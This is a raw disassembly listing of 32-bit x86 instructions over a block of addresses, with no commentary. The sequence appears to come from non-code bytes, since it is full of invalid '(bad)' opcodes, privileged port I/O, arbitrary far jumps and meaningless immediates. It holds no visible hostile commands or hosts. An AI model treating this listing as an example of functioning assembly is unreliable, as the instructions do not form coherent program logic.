  422f0b:	xchg   ebx,eax
  422f0c:	mov    esp,0xb7ee8cab
  422f11:	xchg   ecx,eax
  422f12:	push   cs
  422f13:	fs test al,0xa
  422f16:	sub    eax,0x8043d80
  422f1b:	jbe    0x422ee9
  422f1d:	mov    ecx,0x9b3c33db
  422f22:	lea    esp,[edx]
  422f24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f25:	aas    
  422f26:	out    0xa9,eax
  422f28:	out    0x34,al
  422f2a:	inc    eax
  422f2b:	stos   DWORD PTR es:[edi],eax
  422f2c:	jb     0x422f31
  422f2e:	scas   al,BYTE PTR es:[edi]
  422f2f:	add    al,0x68
  422f31:	es xchg edx,eax
  422f33:	xchg   ecx,eax
  422f34:	cmp    eax,0x20efddc2
  422f39:	pop    ecx
  422f3a:	push   ds
  422f3b:	cmp    edi,DWORD PTR [edx]
  422f3d:	xchg   esi,eax
  422f3e:	push   edi
  422f3f:	pop    esp
  422f40:	pop    ebx
  422f41:	jb     0x422f28
  422f43:	loope  0x422f1c
  422f45:	add    DWORD PTR [esi],0xbf8cdb36
  422f4b:	stc    
  422f4c:	cmc    
  422f4d:	push   ds
  422f4e:	(bad)  
  422f4f:	pop    edi
  422f50:	push   DWORD PTR [ecx-0x5e]
  422f53:	lods   al,BYTE PTR ds:[esi]
  422f54:	int3   
  422f55:	xchg   DWORD PTR [di+0x78],ebx
  422f59:	clc    
  422f5a:	and    esp,DWORD PTR [edi]
  422f5c:	aaa    
  422f5d:	mov    esp,DWORD PTR [eiz*4+0x6ad0a602]
  422f64:	mov    bl,0xc
  422f66:	lock mov BYTE PTR es:0x716a9837,bl
  422f6e:	stos   BYTE PTR es:[edi],al
  422f6f:	aas    
  422f70:	mov    dl,0xd2
  422f72:	xchg   ecx,eax
  422f73:	jae    0x422f1f
  422f75:	add    dl,al
  422f77:	and    edi,ebp
  422f79:	outs   dx,DWORD PTR ds:[esi]
  422f7a:	xchg   esp,eax
  422f7b:	(bad)  
  422f7c:	fidivr DWORD PTR [ebp-0x41]
  422f7f:	je     0x422f4a
  422f81:	adc    eax,esp
  422f83:	mov    eax,ds:0xc0dd4e18
  422f89:	sbb    BYTE PTR [bx+si-0x66db],0x72
  422f8f:	cmc    
  422f90:	ins    BYTE PTR es:[edi],dx
  422f91:	jmp    0x6ae:0xc37ecefd
  422f98:	pop    ss
  422f99:	sti    
  422f9a:	not    BYTE PTR [ecx]
  422f9c:	inc    eax
  422f9d:	push   ds
  422f9e:	aaa    
  422f9f:	cmp    eax,0xe2506a60
  422fa4:	sbb    al,0xd1
  422fa6:	xor    al,BYTE PTR [edi+0x20]
  422fa9:	ss mov ebx,0x2fdd27fb
  422faf:	shr    BYTE PTR [ebx-0x7d],0xee
  422fb3:	fld    st(0)
  422fb5:	rcl    BYTE PTR [ebp-0x4da1f4c8],cl
  422fbb:	mov    al,ds:0xba987523
  422fc0:	test   al,0x34
  422fc2:	adc    BYTE PTR [ebx-0x95d3de3],bl
  422fc8:	cmp    ebp,ecx
  422fca:	shl    BYTE PTR [ebp+edi*1-0x59b4806b],cl
  422fd1:	and    eax,0x5ba55b1f
  422fd6:	dec    ebx
  422fd7:	mov    BYTE PTR [eax-0xe829fc9],ah
  422fdd:	(bad)  
  422fde:	in     eax,dx
  422fdf:	or     DWORD PTR [ebp-0x1caa024a],ebp
  422fe5:	iret   
  422fe6:	call   0x9e1ae587
  422feb:	retf   0x6660
  422fee:	sbb    DWORD PTR [ebp-0x4bde6d97],edi
  422ff4:	cmc    
  422ff5:	aad    0xe0
  422ff7:	adc    eax,0x308e0a3f
  422ffc:	pop    ebp
  422ffd:	idiv   DWORD PTR [esi+0x298ee019]
  423003:	popf   
  423004:	sub    edi,edi
  423006:	add    eax,0xc61e52f1
  42300b:	and    al,0xf2
  42300d:	adc    esp,esp
  42300f:	xchg   esp,eax
  423010:	push   eax
  423011:	sbb    BYTE PTR [ecx],al
  423013:	imul   ebx,DWORD PTR [edx],0xffffffeb
  423016:	mov    eax,ds:0x9a18c9a0
  42301b:	mov    bh,0x41
  42301d:	retf   
  42301e:	jg     0x422ff2
  423020:	pop    eax
  423021:	jae    0x423076
  423023:	rcr    cl,0x4a
  423026:	es push 0x79
  423029:	imul   ebx,ebp,0xd87d6e78
  42302f:	push   eax
  423030:	js     0x422fc1
  423032:	xor    eax,DWORD PTR [ecx-0x5f]
  423035:	xchg   esp,eax
  423036:	popa   
  423037:	push   edx
  423038:	das    
  423039:	call   0x5f55:0x2efd49b5
  423040:	and    BYTE PTR [ecx-0x3f],dh
  423043:	dec    ecx
  423044:	test   DWORD PTR [esi-0x28],0x98aad5d3
  42304b:	nop
  42304c:	rol    BYTE PTR [ebp+0x633ededd],0xa6
  423053:	pop    es
  423054:	add    eax,0x9847f658
  423059:	inc    edi
  42305a:	std    
  42305b:	adc    edi,DWORD PTR [ebp-0x17c2a0d8]
  423061:	out    dx,al
  423062:	fstp   DWORD PTR [ecx-0x5e6509e0]
  423068:	es xchg esp,eax
  42306a:	nop
  42306b:	retf   0x947b
  42306e:	lea    eax,[eax]
	...
  423078:	add    BYTE PTR [eax],al
  42307a:	repnz rol BYTE PTR ds:0xf6d53751,0xe3
  423082:	test   BYTE PTR [eax],0xec
  423085:	inc    esi
  423086:	push   ebp
  423087:	sub    eax,0xaacca246
  42308c:	add    DWORD PTR [eax],eax
  42308e:	std    
  42308f:	add    DWORD PTR [eax],eax
  423091:	add    BYTE PTR [edx-0x72],al
  423094:	sub    DWORD PTR [ecx+ebp*2-0x18c15512],ebp
  42309b:	out    0x87,al
  42309d:	jge    0x42305c
  42309f:	inc    esi
  4230a0:	dec    ebp
  4230a1:	cmc    
  4230a2:	jmp    0x85f3:0x61cfdd3a
  4230a9:	dec    ebx
  4230aa:	test   eax,0x8a3c386a
  4230af:	inc    DWORD PTR [eax-0x5b]
  4230b2:	xchg   edx,eax
  4230b3:	cld    
  4230b4:	lods   al,BYTE PTR ds:[esi]
  4230b5:	retf   
  4230b6:	lods   eax,DWORD PTR ds:[esi]
  4230b7:	out    dx,al
  4230b8:	xor    eax,0x11363a8a
  4230bd:	mov    ds:0x40622f74,eax
  4230c2:	sbb    cl,BYTE PTR [edi]
  4230c4:	mov    ch,0x41
  4230c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230c7:	pop    edx
  4230c8:	pop    es
  4230c9:	cmp    eax,0xa665a93c
  4230ce:	cmp    DWORD PTR [eax+ebx*8-0x7b79204f],edx
  4230d5:	mov    esi,0xfc43caae
  4230da:	xor    ah,al
  4230dc:	or     ecx,DWORD PTR [esi+0x13]
  4230df:	aaa    
  4230e0:	(bad)  
  4230e2:	cwde   
  4230e3:	pop    es
  4230e4:	xor    ah,ah
  4230e6:	xlat   BYTE PTR ds:[ebx]
  4230e7:	shr    esi,cl
  4230e9:	ja     0x423106
  4230eb:	(bad)  
  4230ec:	push   eax
  4230ed:	fidivr DWORD PTR [ecx-0x41be0132]
  4230f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230f4:	push   edx
  4230f5:	ret    
  4230f6:	fdivr  QWORD PTR [ebx-0x26b31a5b]
  4230fc:	or     ebx,DWORD PTR [edx]
  4230fe:	dec    eax
  4230ff:	and    BYTE PTR [edi],bh
  423101:	inc    ecx
  423102:	ds jl  0x423120
  423105:	and    edx,ebx
  423107:	sbb    DWORD PTR [esp+ebp*8+0x3c],edi
  42310b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42310c:	repz iret 
  42310e:	popa   
  42310f:	adc    BYTE PTR [edx+ebp*2+0x7b148db8],bh
  423116:	rcr    ebx,0x5f
  423119:	mov    fs:0x2d24b0dd,al
  42311f:	ret    
  423120:	jnp    0x423116
  423122:	in     al,dx
  423123:	fidiv  WORD PTR [eax]
  423125:	not    BYTE PTR [esi+ebp*2-0x627489c]
  42312c:	jb     0x42314c
  42312e:	and    DWORD PTR es:[edx+edi*4+0x302864fe],esp
  423136:	mov    WORD PTR [esi-0x60dfd00d],ds
  42313c:	into   
  42313d:	adc    ebp,esp
  42313f:	test   al,0x8f
  423141:	dec    ebx
  423142:	in     al,0x7e
  423144:	test   DWORD PTR [edx-0x4010df1b],ecx
  42314a:	cmp    edx,esi
  42314c:	fwait
  42314d:	mov    ebp,0xf80bbd9d
  423152:	push   cs
  423153:	ja     0x423122
  423155:	push   ebp
  423156:	jge    0x423117
  423158:	or     bh,al
  42315a:	pop    esi
  42315b:	test   eax,0x9da69538
  423160:	jmp    0x4230fa
  423162:	xchg   edx,eax
  423163:	adc    eax,0xddb1a7de
  423168:	arpl   WORD PTR [esi+edx*8-0x5e],cx
  42316c:	aad    0xbc
  42316e:	jnp    0x42313f
  423170:	jl     0x4231dd
  423172:	or     eax,0xf272ce5f
  423177:	cmp    BYTE PTR [edi-0x2e],dh
  42317a:	cmp    cl,BYTE PTR [ecx-0x31]
  42317d:	(bad)  
  42317f:	call   0xb0f:0xd0f61e5f
  423186:	mov    ebp,0xaa0f63a
  42318b:	sbb    al,0x51
  42318d:	jmp    0xf69bbdf1
  423192:	shl    BYTE PTR [ebx-0x5e840adf],cl
  423198:	and    al,0xeb
  42319a:	cli    
  42319b:	into   
  42319c:	pop    ss
  42319d:	cdq    
  42319e:	dec    ecx
  42319f:	sub    DWORD PTR [edx],edi
  4231a1:	xchg   ebp,eax
  4231a2:	xchg   DWORD PTR [edi],edi
  4231a4:	jle    0x42320d
  4231a6:	cwde   
  4231a7:	test   DWORD PTR [esi-0x1ddaf971],edx
  4231ad:	stos   DWORD PTR es:[edi],eax
  4231ae:	sbb    BYTE PTR [edx],al
  4231b0:	loop   0x4231df
  4231b2:	adc    BYTE PTR ds:0xbe44d5f8,bl
  4231b8:	aaa    
  4231b9:	pop    eax
  4231ba:	gs stos BYTE PTR es:[edi],al
  4231bc:	bound  edi,QWORD PTR [esp+ecx*4+0x7d]
  4231c0:	pop    esp
  4231c1:	stos   DWORD PTR es:[edi],eax
  4231c2:	or     eax,0x75fee89e
  4231c7:	cmp    al,0xdd
  4231c9:	adc    eax,DWORD PTR [ebx]
  4231cb:	neg    BYTE PTR [esi-0x32]
  4231ce:	xchg   esp,eax
  4231cf:	cmc    
  4231d0:	fidiv  WORD PTR [ebp-0x7bcaffb7]
  4231d6:	mov    esp,DWORD PTR [ebp+0x556e7a6]
  4231dc:	or     esp,DWORD PTR [eax+0x2b9320cd]
  4231e2:	push   ds
  4231e3:	sub    al,0x48
  4231e5:	cmp    cl,BYTE PTR [ebp-0x61e6e89a]
  4231eb:	mov    ah,0xd4
  4231ed:	xchg   esp,eax
  4231ee:	xchg   ecx,eax
  4231ef:	mov    bl,ch
  4231f1:	fwait
  4231f2:	mov    eax,ds:0x5539af1a
  4231f7:	mov    ebx,0xe65cf974
  4231fc:	aad    0x94
  4231fe:	stos   DWORD PTR es:[edi],eax
  4231ff:	xor    al,0xf7
  423201:	das    
  423202:	mov    ecx,0x1cea8fd9
  423207:	jmp    0x4231c4
  423209:	ja     0x42319b
  42320b:	cld    
  42320c:	ins    DWORD PTR es:[edi],dx
  42320d:	inc    ebx
  42320e:	sub    edx,eax
  423210:	lahf   
  423211:	sbb    eax,DWORD PTR [ebp-0x25c1d912]
  423217:	inc    ebx
  423218:	pop    edx
  423219:	jne    0x4231c9
  42321b:	add    ebx,DWORD PTR [ecx]
  42321d:	das    
  42321e:	xchg   esp,eax
  42321f:	xchg   BYTE PTR [ebx-0x1e9a3630],al
  423225:	lods   eax,DWORD PTR ds:[esi]
  423226:	sbb    al,BYTE PTR [edx+0x27]
  423229:	lods   al,BYTE PTR ds:[esi]
  42322a:	adc    eax,0xa6fab3f6
  42322f:	test   DWORD PTR [bx-0x7b9c],0x49801450
  423238:	push   0xdb95e442
  42323d:	ds stos DWORD PTR es:[edi],eax
  42323f:	hlt    
  423240:	dec    edx
  423241:	int    0x32
  423243:	adc    esp,DWORD PTR [edi+eiz*4+0x96d5b35]
  42324a:	mov    esp,ds
  42324c:	test   al,0x7c
  42324e:	imul   ecx,DWORD PTR [edi+ebx*8-0x3af06c23],0xffffff9e
  423256:	cmp    ah,BYTE PTR [edi]
  423258:	jmp    0xd23eadc7
  42325d:	sbb    al,0xd4
  42325f:	and    al,0xe7
  423261:	out    dx,al
  423262:	xchg   DWORD PTR [edi+0x56],eax
  423265:	jecxz  0x4232be
  423267:	test   BYTE PTR [esi+0x50],dl
  42326a:	(bad)
  42326d:	sahf   
  42326e:	cmp    ch,BYTE PTR [ebx+0x53]
  423271:	fidivr DWORD PTR [ebx-0x5e]
  423274:	cmp    edx,ebp
  423276:	xchg   ebp,eax
  423277:	adc    ch,bh
  423279:	push   ds
  42327a:	popf   
  42327b:	jmp    0xc641053c
  423280:	cld    
  423281:	inc    edi
  423282:	inc    esp
  423283:	scas   al,BYTE PTR es:[edi]
  423284:	adc    ebp,DWORD PTR [esi+edi*8]
  423287:	or     al,BYTE PTR [ebx-0x22]
  42328a:	das    
  42328b:	fistp  WORD PTR ds:0x3d51
	...
  423299:	add    BYTE PTR [ebx+0x41],al
  42329c:	popa   
  42329d:	data16 arpl WORD PTR [esi+0x47],sp
  4232a1:	gs push cs
  4232a3:	mov    BYTE PTR [edi-0x37],bh
  4232a6:	add    eax,0xc973681c
  4232ab:	lods   al,BYTE PTR ds:[esi]
  4232ac:	add    DWORD PTR [eax],eax
  4232ae:	std    
  4232af:	add    DWORD PTR [eax],eax
  4232b1:	add    BYTE PTR [eax],bl
  4232b3:	ss scas eax,DWORD PTR es:[edi]
  4232b5:	popa   
  4232b6:	jbe    0x4232cd
  4232b8:	push   ecx
  4232b9:	sbb    eax,0x46790e32
  4232be:	push   edi
  4232bf:	and    DWORD PTR [edi-0x43ff6521],ebx
  4232c5:	fwait
  4232c6:	into   
  4232c7:	loopne 0x42328c
  4232c9:	cli    
  4232ca:	xchg   BYTE PTR [esi+edi*2],dl
  4232cd:	and    DWORD PTR [eax],ebx
  4232cf:	in     al,dx
  4232d0:	in     al,dx
  4232d1:	outs   dx,DWORD PTR ds:[esi]
  4232d2:	ror    DWORD PTR [edi],0x75
  4232d5:	cmp    BYTE PTR ds:0xf870559d,dl
  4232db:	es je  0x423350
  4232de:	or     eax,0xf693c1e4
  4232e3:	jge    0x4232cc
  4232e5:	outs   dx,DWORD PTR ds:[esi]
  4232e6:	adc    eax,0x232621df
  4232eb:	sahf   
  4232ec:	or     eax,0xef7b72e
  4232f1:	adc    edi,DWORD PTR [ecx+0x7e]
  4232f4:	add    al,0x30
  4232f6:	jp     0x423331
  4232f8:	std    
  4232f9:	ss jmp 0x64b:0x647055be
  423301:	push   ebx
  423302:	mov    al,0x15
  423304:	pop    esi
  423305:	into   
  423306:	hlt    
  423307:	xchg   ebp,eax
  423308:	sahf   
  423309:	push   ecx
  42330a:	out    0xf4,eax
  42330c:	cmp    edx,esi
  42330e:	sahf   
  42330f:	cmp    ebx,DWORD PTR [ebp-0x37]
  423312:	cmp    esi,ebp
  423314:	push   edi
  423315:	test   BYTE PTR [ecx-0x5],0x49
  423319:	fisub  WORD PTR [edx-0x3b3938bd]
  42331f:	dec    edx
  423320:	popa   
  423321:	or     edi,DWORD PTR [edi-0x32b1aba9]
  423327:	imul   ebp,edi,0x2b
  42332a:	ins    DWORD PTR es:[edi],dx
  42332b:	xor    eax,0xf665fae
  423330:	int    0x45
  423332:	cs out 0x0,ax
  423336:	sbb    dh,dh
  423338:	sbb    BYTE PTR [edx],cl
  42333a:	pop    es
  42333b:	jne    0x4232cc
  42333d:	push   cs
  42333e:	xchg   esp,eax
  42333f:	leave  
  423340:	sub    BYTE PTR [esi-0x6b],ah
  423343:	push   edi
  423344:	sub    BYTE PTR [ecx+0x269623af],ah
  42334a:	or     ebx,edi
  42334c:	or     esi,DWORD PTR ds:0xbd9bc6a5
  423352:	aas    
  423353:	xchg   DWORD PTR [ebx],ecx
  423355:	inc    ebp
  423356:	stc    
  423357:	jle    0x42331a
  423359:	mov    DWORD PTR [ebp+0x33fc2e99],edi
  42335f:	mov    bh,0x8a
  423361:	adc    ebp,DWORD PTR [esi+ebx*1]
  423364:	dec    ebx
  423365:	and    bl,BYTE PTR [bx+di]
  423368:	fstp   DWORD PTR [ebx+0x28]
  42336c:	adc    bh,dl
  42336e:	neg    BYTE PTR [eax]
  423370:	lock jo 0x423395
  423373:	in     al,0xa
  423375:	xor    DWORD PTR [edi-0x45],ebx
  423378:	(bad)  
  423379:	es cdq 
  42337b:	add    al,0x9a
  42337d:	(bad)  
  42337e:	adc    ebx,DWORD PTR [ecx-0x44]
  423381:	inc    esi
  423382:	cmp    al,0x41
  423384:	mov    al,ds:0xce392489
  423389:	pushf  
  42338a:	xor    ebp,DWORD PTR [ecx+0x4ab22e43]
  423390:	aad    0x80
  423392:	push   ebx
  423393:	jle    0x423360
  423395:	test   al,0xb4
  423397:	outs   dx,DWORD PTR ds:[esi]
  423398:	and    eax,DWORD PTR [esi-0x6d8f05a0]
  42339e:	fwait
  42339f:	es ja  0x423330
  4233a2:	adc    dh,0x6c
  4233a5:	jmp    0x3b47:0x981eaa6
  4233ac:	rcl    edx,cl
  4233ae:	hlt    
  4233af:	mov    bl,0xf3
  4233b1:	pop    esp
  4233b2:	je     0x423389
  4233b4:	push   esp
  4233b5:	pop    edi
  4233b6:	(bad)  
  4233b7:	cmp    edx,DWORD PTR [edi]
  4233b9:	cmp    dl,BYTE PTR [ecx-0x67]
  4233bc:	dec    edi
  4233bd:	popf   
  4233be:	mov    edi,0x8572e0e8
  4233c3:	add    al,ch
  4233c5:	test   eax,0x559b886f
  4233ca:	mov    eax,ds:0xb7355e2a
  4233cf:	inc    ebx
  4233d0:	pop    esp
  4233d1:	xchg   edx,eax
  4233d2:	sbb    DWORD PTR [edx-0x43],ebp
  4233d5:	inc    ebx
  4233d6:	aas    
  4233d7:	mov    al,ds:0xebf095d1
  4233dc:	push   esi
  4233dd:	push   ebp
  4233de:	je     0x4233db
  4233e0:	das    
  4233e1:	test   DWORD PTR [ecx+eax*1+0x63],ebx
  4233e5:	adc    al,0x6b
  4233e7:	sub    ebx,DWORD PTR [ebp-0x3ab25b72]
  4233ed:	push   esi
  4233ee:	out    dx,eax
  4233ef:	ret    0x9c67
  4233f2:	mov    al,ds:0xca4b4cc9
  4233f7:	or     DWORD PTR ds:[ebx+ebx*1],edi
  4233fb:	inc    ebp
  4233fc:	(bad)  
  4233fd:	or     bh,ch
  4233ff:	cwde   
  423400:	rcr    DWORD PTR [ebx],1
  423402:	mov    fs,WORD PTR [ecx-0x36]
  423405:	sbb    BYTE PTR [esi+0x3e],cl
  423408:	repnz xchg ecx,eax
  42340a:	xlat   BYTE PTR ds:[ebx]
  42340b:	sbb    eax,0xf40148dd
  423410:	xchg   ecx,eax
  423411:	push   ecx
  423412:	and    eax,0xb53af87b
  423417:	jg     0x4233f4
  423419:	jmp    0x4233aa
  42341b:	test   DWORD PTR [eax+ecx*2-0x1b84893d],ecx
  423422:	dec    esi
  423423:	and    BYTE PTR [ebx+0x336b9738],cl
  423429:	jbe    0x42348b
  42342b:	sbb    DWORD PTR [eax-0x6c],ebp
  42342e:	(bad)  
  42342f:	(bad)  
  423430:	mov    esi,0xe86395b1
  423435:	ins    DWORD PTR es:[edi],dx
  423436:	ret    0xd55e
  423439:	push   ebp
  42343a:	fadd   DWORD PTR [esi]
  42343c:	push   es
  42343d:	sub    eax,0x3b0e582e
  423442:	mov    esp,0x34bbb348
  423447:	push   edi
  423448:	sbb    bl,0xe3
  42344b:	out    0x2f,eax
  42344d:	sar    ebp,0xef
  423450:	or     ebx,DWORD PTR [eax-0x34]
  423453:	ins    DWORD PTR es:[edi],dx
  423454:	add    al,0x9a
  423456:	and    BYTE PTR [ebp+0x3],0xfe
  42345a:	push   ss
  42345b:	cs dec esp
  42345d:	jbe    0x4234be
  42345f:	inc    ebx
  423460:	rol    DWORD PTR [eax-0x50],0xae
  423464:	push   ebp
  423465:	jne    0x42341d
  423467:	mov    cl,0x28
  423469:	inc    ecx
  42346a:	mov    ah,0x74
  42346c:	lods   al,BYTE PTR ds:[esi]
  42346d:	jne    0x423481
  42346f:	and    cl,BYTE PTR [esi+eax*4]
  423472:	lea    ebx,[eax+0xec28837]
  423478:	scas   eax,DWORD PTR es:[edi]
  423479:	mov    ecx,0x892538ac
  42347e:	inc    ebx
  42347f:	jg     0x423463
  423481:	sbb    esi,DWORD PTR [ebx+0x40]
  423484:	test   DWORD PTR [esi],ecx
  423486:	jg     0x42345b
  423488:	jge    0x423477
  42348a:	mov    ebp,0x84350867
  42348f:	jo     0x423497
  423491:	lahf   
  423492:	in     al,0x9
  423494:	leave  
  423495:	dec    edx
  423496:	stos   BYTE PTR es:[edi],al
  423497:	loope  0x423478
  423499:	int3   
  42349a:	fs add al,0x22
  42349d:	idiv   BYTE PTR [eax+ebp*8+0x495cd2fa]
  4234a4:	jge    0x423524
  4234a6:	adc    al,0x38
  4234a8:	clc    
  4234a9:	sub    eax,0x15c7309a
  4234ae:	adc    eax,DWORD PTR [eax]
	...
  4234b8:	add    BYTE PTR [eax],al
  4234ba:	mov    ebp,edx
  4234bc:	rcr    DWORD PTR [ebx],cl
  4234be:	repz cmp ecx,ebx
  4234c1:	cli    
  4234c2:	cmp    dh,bl
  4234c4:	adc    BYTE PTR [ebx],dl
  4234c6:	mov    ebx,0xc61f00d6
  4234cb:	scas   al,BYTE PTR es:[edi]
  4234cc:	add    DWORD PTR [eax],eax
  4234ce:	std    
  4234cf:	add    DWORD PTR [eax],eax
  4234d1:	add    BYTE PTR [edx+0x48],al
  4234d4:	jl     0x4234d6
  4234d6:	iret   
  4234d7:	cmp    eax,0xc294dda3
  4234dc:	addr16 in al,0x52
  4234df:	or     bh,dl
  4234e1:	std    
  4234e2:	int    0xa0
  4234e4:	mov    al,0x37
  4234e6:	nop
  4234e7:	inc    esi
  4234e8:	loopne 0x423520
  4234ea:	fisttp QWORD PTR [ecx-0x37]
  4234ed:	aas    
  4234ee:	xor    al,0x8a
  4234f0:	imul   eax,DWORD PTR [eax],0xffffff93
  4234f3:	retf   
  4234f4:	or     al,0x49
  4234f6:	pop    ecx
  4234f7:	jmp    0x4028:0xe9c03e5c
  4234fe:	test   BYTE PTR ds:0xf55df79,ch
  423504:	xchg   eax,edx
  423506:	push   ss
  423507:	aam    0xa
  423509:	sbb    BYTE PTR [edi-0x35f5480c],0x98
  423510:	lods   al,BYTE PTR ds:[esi]
  423511:	call   0xf7de836c
  423516:	sbb    DWORD PTR [ebp+0x13d3c23c],ebx
  42351c:	retf   
  42351d:	xor    ecx,DWORD PTR [ebp+esi*8+0x206d2989]
  423524:	sub    ch,0x14
  423527:	lahf   
  423528:	test   eax,0x295d85eb
  42352d:	out    0x5e,eax
  42352f:	adc    edx,DWORD PTR [edi-0x1e84b000]
  423535:	mov    dl,0x24
  423537:	pop    es
  423538:	pop    ebx
  423539:	jns    0x42355a
  42353b:	loop   0x4234ce
  42353d:	ficom  DWORD PTR [eax+0x7d]
  423540:	push   eax
  423541:	jno    0x4234da
  423543:	sbb    DWORD PTR [edi],ebp
  423545:	sub    eax,0xb03c3804
  42354a:	cmp    BYTE PTR [ecx],dh
  42354c:	rcr    BYTE PTR ds:0x40c5d694,0xb9
  423553:	adc    eax,0xab946432
  423558:	cwde   
  423559:	push   ebx
  42355a:	cmp    eax,0x17067420
  42355f:	cmp    ah,BYTE PTR [ebp+0x33]
  423562:	xor    eax,0xdf465d2e
  423567:	out    0xe6,eax
  423569:	jb     0x4235ac
  42356b:	or     eax,0xb6479db9
  423570:	cmp    eax,0x781798e1
  423575:	cdq    
  423576:	out    dx,eax
  423577:	fmul   st,st(5)
  423579:	call   0x1a63d70e
  42357e:	mov    WORD PTR [esi-0x3f754602],ds
  423584:	or     BYTE PTR [edx-0x678057bc],cl
  42358a:	nop
  42358b:	mov    ebx,0x986ea5bc
  423590:	push   esp
  423591:	jg     0x423554
  423593:	xlat   BYTE PTR ds:[ebx]
  423594:	dec    ebp
  423595:	pop    ss
  423596:	retf   
  423597:	xchg   ebp,eax
  423598:	aam    0x8d
  42359a:	pop    ecx
  42359b:	inc    eax
  42359c:	sbb    BYTE PTR [ecx+0x79fa6916],0x1c
  4235a3:	hlt    
  4235a4:	dec    ecx
  4235a5:	push   ebp
  4235a6:	loop   0x4235b2
  4235a8:	icebp  
  4235a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4235aa:	xchg   BYTE PTR [ebp-0x41bbad5f],bh
  4235b0:	retf   0x1e7e
  4235b3:	aad    0x95
  4235b5:	push   esi
  4235b6:	enter  0x282,0xa9
  4235ba:	adc    BYTE PTR [esi],al
  4235bc:	in     eax,0x6f
  4235be:	sti    
  4235bf:	xchg   DWORD PTR [ebx-0xba629ca],ecx
  4235c5:	mov    ebx,0x746ae751
  4235ca:	imul   bl
  4235cc:	fcmovbe st,st(4)
  4235ce:	inc    edx
  4235cf:	popf   
  4235d0:	aad    0x30
  4235d2:	fbstp  TBYTE PTR [esi+0x22547ca8]
  4235d8:	inc    ebp
  4235d9:	sbb    eax,0x7b39371
  4235de:	test   DWORD PTR [esp+edi*4+0x51],edi
  4235e2:	push   esp
  4235e3:	push   eax
  4235e4:	mov    dh,0x51
  4235e6:	mov    ebp,0x71e1bd80
  4235eb:	inc    esi
  4235ec:	cmp    BYTE PTR [ebx],al
  4235ee:	dec    esp
  4235ef:	inc    ecx
  4235f0:	jge    0x423627
  4235f2:	cli    
  4235f3:	xor    al,0xfb
  4235f5:	aam    0xb7
  4235f7:	gs in  eax,0xa
  4235fa:	lods   eax,DWORD PTR ds:[esi]
  4235fb:	adc    DWORD PTR [edx+ebx*4],esp
  4235fe:	sub    eax,0x7cc70c12
  423603:	imul   esi,ebx,0xad33a38a
  423609:	neg    DWORD PTR [ebp-0x662ef09e]
  42360f:	ds fwait
  423611:	lahf   
  423612:	fwait
  423613:	sbb    eax,0xad578ace
  423618:	pusha  
  423619:	shl    DWORD PTR [ebx-0x328382e5],0xaa
  423620:	pop    esi
  423621:	loopne 0x423698
  423623:	loope  0x423679
  423625:	pop    esi
  423626:	sub    DWORD PTR [esi],ebp
  423628:	in     eax,0x3a
  42362a:	(bad)  
  42362b:	out    dx,eax
  42362c:	fadd   st(7),st
  42362e:	fs ins BYTE PTR es:[edi],dx
  423630:	inc    ebx
  423631:	js     0x42363f
  423633:	cdq    
  423634:	xchg   ebx,eax
  423635:	in     al,dx
  423636:	in     al,dx
  423637:	jbe    0x423621
  423639:	xchg   edi,eax
  42363a:	stos   DWORD PTR es:[edi],eax
  42363b:	jbe    0x423675
  42363d:	sub    al,0xa3
  42363f:	repnz mov ebp,0x1eca2cc1
  423645:	jp     0x423602
  423647:	lahf   
  423648:	(bad)  
  423649:	fimul  DWORD PTR [eax-0x70]
  42364c:	mov    bh,0x21
  42364e:	call   0x20f6e553
  423653:	aas    
  423654:	or     ecx,edi
  423656:	jge    0x42363b
  423658:	xchg   eax,edx
  42365a:	and    BYTE PTR [ecx-0x3a74e52b],dh
  423660:	cs jno 0x4236a2
  423663:	outs   dx,DWORD PTR ds:[esi]
  423664:	cs aam 0xbc
  423667:	xchg   ebx,eax
  423668:	lds    ebp,FWORD PTR [edx+0x6160ca80]
  42366e:	mov    ch,0xb0
  423670:	xchg   edx,eax
  423671:	dec    ebx
  423672:	mov    dl,0x7
  423675:	js     0x423648
  423677:	leave  
  423678:	lock push ds
  42367a:	(bad)  
  42367b:	dec    esp
  42367c:	imul   edx,ecx,0x75
  42367f:	fisubr WORD PTR [ebx]
  423681:	shl    BYTE PTR [ebx-0x50e5076f],1
  423687:	jb     0x4236bb
  423689:	sbb    esp,ecx
  42368b:	jg     0x423674
  42368d:	push   cs
  42368e:	lahf   
  42368f:	adc    cl,BYTE PTR [edx]
  423691:	cmp    dl,BYTE PTR ds:0xb374964a
  423697:	loopne 0x42364a
  423699:	adc    ecx,esi
  42369b:	sbb    esi,ecx
  42369d:	cmp    al,0xc9
  42369f:	xor    edx,esp
  4236a1:	aaa    
  4236a2:	and    DWORD PTR [edx+0x109a0eb1],ebx
  4236a8:	sbb    eax,0x2d6aed1a
  4236ad:	xchg   ebx,eax
  4236ae:	icebp  
  4236af:	leave  
  4236b0:	stos   DWORD PTR es:[edi],eax
  4236b1:	fs (bad) 
  4236b3:	rcl    BYTE PTR [esi+ecx*2-0xa],cl
  4236b7:	pop    eax
  4236b8:	loopne 0x4236d2
  4236ba:	loope  0x4236ef
  4236bc:	pushf  
  4236bd:	repnz adc al,BYTE PTR [edi+0x77c8c2e0]
  4236c4:	cs repz leave 
  4236c7:	and    eax,0xf28768e2
  4236cc:	push   ecx
  4236cd:	sti    
  4236ce:	popa   
	...
  4236d7:	add    BYTE PTR [eax],al
  4236d9:	add    dl,dl
  4236db:	and    dl,BYTE PTR [esi-0x21410966]
  4236e1:	push   0x61
  4236e3:	push   cs
  4236e4:	cmp    DWORD PTR [eax],esi
  4236e6:	popa   
  4236e7:	and    dh,dl
  4236e9:	retf   0xb0c3
  4236ec:	add    DWORD PTR [eax],eax
  4236ee:	std    
  4236ef:	add    DWORD PTR [eax],eax
  4236f1:	add    BYTE PTR [edx+ebx*8],cl
  4236f4:	out    0x80,al
  4236f6:	inc    eax
  4236f7:	jle    0x4236b0
  4236f9:	add    DWORD PTR [edi],eax
  4236fb:	lds    esi,FWORD PTR [ecx]
  4236fd:	fwait
  4236fe:	test   al,0xd4
  423700:	add    al,0x73
  423702:	jle    0x4236e0
  423704:	idiv   DWORD PTR [ecx]
  423706:	jmp    FWORD PTR [eax-0x55]
  423709:	inc    esi
  42370a:	fld    TBYTE PTR ds:0xcb8de2e4
  423710:	idiv   BYTE PTR [eax]
